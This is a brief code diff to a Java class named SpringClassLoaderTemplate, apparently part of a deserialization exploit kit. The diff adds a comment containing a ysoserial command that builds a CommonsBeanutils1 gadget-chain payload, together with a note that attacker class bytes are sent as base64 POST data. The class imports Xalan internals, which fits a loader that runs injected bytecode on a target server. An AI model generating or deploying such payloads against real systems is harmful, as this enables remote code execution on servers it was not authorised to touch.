@@ -6,6 +6,9 @@ import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 /*
 * get class data from POST data
+
+java -jar ysoserial-all.jar CommonsBeanutils1 "CLASS:SpringClassLoaderTemplate"
+Post Data:
 classData=base64 class
 * */
 public class SpringClassLoaderTemplate {
